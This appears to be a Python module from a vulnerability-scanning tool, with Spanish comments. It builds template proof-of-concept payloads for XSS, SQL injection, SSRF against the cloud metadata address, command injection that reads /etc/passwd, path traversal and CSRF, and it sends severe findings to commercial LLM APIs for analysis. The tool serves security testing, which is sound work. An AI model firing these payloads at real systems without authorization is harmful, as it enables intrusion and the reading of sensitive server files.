"""
Módulo de Análisis con IA (Multi-Provider) + PoC Automático
Usa LLMs (Claude, Gemini) para analizar hallazgos, generar PoCs e hipótesis.
"""

import requests
from src.utils import log, logger

class AIAnalyzer:
    def __init__(self, config: dict):
        self.config = config.get("ai", {})
        self.claude_key = self.config.get("claude_api_key")
        self.gemini_key = self.config.get("gemini_api_key")
        self.openai_key = self.config.get("openai_api_key")

    def generate_poc(self, finding: dict) -> str:
        """
        Genera PoC automático basado en el tipo de vulnerabilidad.
        """
        vuln_type = finding.get("type", "").lower()
        url = finding.get("url", "")
        
        # Evitar f-strings anidados - usar strings normales
        if "xss" in vuln_type:
            poc = "# PoC XSS:\n"
            poc += "curl -X GET '" + url + "<script>alert(1)</script>'\n"
            poc += "curl -X GET '" + url + "%3Cscript%3Ealert(1)%3C/script%3E'"
            return poc
        elif "sqli" in vuln_type:
            poc = "# PoC SQLi:\n"
            poc += "curl -X GET '" + url + "?' OR '1'='1'\n"
            poc += "curl -X GET '" + url + "' UNION SELECT 1,2,3--"
            return poc
        elif "idor" in vuln_type:
            poc = "# PoC IDOR:\n"
            poc += "# Cambiar ID en la URL\n"
            poc += "curl -X GET '" + url + "'"
            return poc
        elif "ssrf" in vuln_type:
            poc = "# PoC SSRF:\n"
            poc += "curl -X GET '" + url + "?url=http://localhost/'\n"
            poc += "curl -X GET '" + url + "?url=http://169.254.169.254/latest/meta-data/'"
            return poc
        elif "csrf" in vuln_type:
            poc = "# PoC CSRF:\n"
            poc += "<form action='" + url + "' method='POST'>\n"
            poc += "  <input name='action' value='delete'/>\n"
            poc += "</form>\n<script>document.forms[0].submit();</script>"
            return poc
        elif "rce" in vuln_type:
            poc = "# PoC RCE:\n"
            poc += "curl -X GET '" + url + "; whoami'\n"
            poc += "curl -X GET '" + url + "; cat /etc/passwd'"
            return poc
        
        # Default
        return "# PoC Generico:\ncurl -X GET '" + url + "'"

    def analyze_finding(self, finding_data: dict, context: str = ""):
        """Envía un hallazgo a la IA para análisis profundo."""
        prompt = "Analiza el siguiente hallazgo: " + str(finding_data)
        
        if self.gemini_key:
            return self._call_gemini(prompt)
        elif self.claude_key:
            return self._call_claude(prompt)
        elif self.openai_key:
            return self._call_openai(prompt)
        else:
            return "No hay API Keys de IA configuradas."

    def _call_gemini(self, prompt: str):
        log("Consultando a Google Gemini AI...", "info")
        url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=" + self.gemini_key
        headers = {'Content-Type': 'application/json'}
        data = {"contents": [{"parts": [{"text": prompt}]}]}
        try:
            r = requests.post(url, headers=headers, json=data, timeout=30)
            res = r.json()
            return res['candidates'][0]['content']['parts'][0]['text']
        except Exception as e:
            logger.error("Error en Gemini: " + str(e))
            return None

    def _call_claude(self, prompt: str):
        log("Consultando a Anthropic Claude...", "info")
        url = "https://api.anthropic.com/v1/messages"
        headers = {
            "x-api-key": self.claude_key,
            "anthropic-version": "2023-06-01",
            "content-type": "application/json"
        }
        data = {
            "model": "claude-3-haiku-20240307",
            "max_tokens": 1024,
            "messages": [{"role": "user", "content": prompt}]
        }
        try:
            r = requests.post(url, headers=headers, json=data, timeout=30)
            res = r.json()
            return res['content'][0]['text']
        except Exception as e:
            logger.error("Error en Claude: " + str(e))
            return None

    def _call_openai(self, prompt: str):
        log("Consultando a OpenAI...", "info")
        url = "https://api.openai.com/v1/chat/completions"
        headers = {
            "Authorization": "Bearer " + self.openai_key,
            "Content-Type": "application/json"
        }
        data = {
            "model": "gpt-4o-mini",
            "messages": [{"role": "user", "content": prompt}],
            "max_tokens": 1024
        }
        try:
            r = requests.post(url, headers=headers, json=data, timeout=30)
            res = r.json()
            return res['choices'][0]['message']['content']
        except Exception as e:
            logger.error("Error en OpenAI: " + str(e))
            return None


def generate_poc_for_finding(finding: dict) -> dict:
    """Genera PoC automático SIN usar IA (basado en reglas)."""
    vuln_type = finding.get("type", "")
    url = finding.get("url", "")
    name = finding.get("name", "")
    combined = (vuln_type + " " + name).lower()
    
    pocs = {
        "xss": {
            "title": "Cross-Site Scripting (XSS)",
            "poc": "# Payload basicas:\n" + url + "<script>alert(1)</script>",
            "impact": "Robo de cookies, session hijacking",
        },
        "sqli": {
            "title": "SQL Injection",
            "poc": "# Error-based:\n" + url + "' UNION SELECT 1,2,3--+",
            "impact": "Extraccion de datos",
        },
        "idor": {
            "title": "Insecure Direct Object Reference",
            "poc": "# Cambiar ID en URL:\ncurl -X GET " + url.replace('id=1', 'id=2') if 'id=' in url else "# Probar con otro ID",
            "impact": "Acceso no autorizado a datos",
        },
        "ssrf": {
            "title": "Server-Side Request Forgery",
            "poc": "# Payloads:\n" + url + "?url=http://169.254.169.254/latest/meta-data/",
            "impact": "Acceso a servicios internos",
        },
        "csrf": {
            "title": "Cross-Site Request Forgery",
            "poc": "# HTML PoC:\n<form action='" + url + "' method='POST'>\n</form>",
            "impact": "Acciones no autorizadas",
        },
        "rce": {
            "title": "Remote Code Execution",
            "poc": "# Linux:\n" + url + "; whoami",
            "impact": "Control total del servidor",
        },
        "path": {
            "title": "Path Traversal / LFI",
            "poc": "# Linux:\n" + url + "?file=../../../../etc/passwd",
            "impact": "Lectura de archivos sensibles",
        },
    }
    
    for key, poc_data in pocs.items():
        if key in combined:
            return poc_data
    
    return {
        "title": name or "Vulnerability",
        "poc": "# PoC basico:\ncurl -X GET " + url,
        "impact": "Depende del contexto",
    }


def run_ai_analysis(context: dict, config: dict):
    """Función orquestadora para la fase de IA."""
    ai = AIAnalyzer(config)
    vulns = context.get("phases", {}).get("vulns", {}).get("findings", [])
    idor_candidates = context.get("phases", {}).get("vulns", {}).get("idor_candidates", [])
    
    interesting = [v for v in vulns if v.get("severity") in ["critical", "high"]]
    ai_results = []
    
    for f in interesting[:10]:
        poc_data = generate_poc_for_finding(f)
        ai_results.append({
            "type": "poc_automatico",
            "finding": f.get("name") or f.get("type"),
            "url": f.get("url", ""),
            "poc": poc_data.get("poc", ""),
            "impact": poc_data.get("impact", ""),
        })
    
    for idor in idor_candidates[:5]:
        if idor.get("poc"):
            ai_results.append({
                "type": "idor_poc",
                "finding": "IDOR Candidate",
                "url": idor.get("url", ""),
                "poc": idor.get("poc"),
                "impact": "Acceso no autorizado a datos",
            })
    
    if config.get("ai", {}).get("gemini_api_key") or config.get("ai", {}).get("claude_api_key"):
        for f in interesting[:3]:
            analysis = ai.analyze_finding(f, context.get("target"))
            if analysis:
                ai_results.append({
                    "type": "ia_analysis",
                    "finding": f.get("name") or f.get("type"),
                    "analysis": analysis
                })
    
    log("IA genero " + str(len(ai_results)) + " PoCs/análisis", "success")
    return ai_results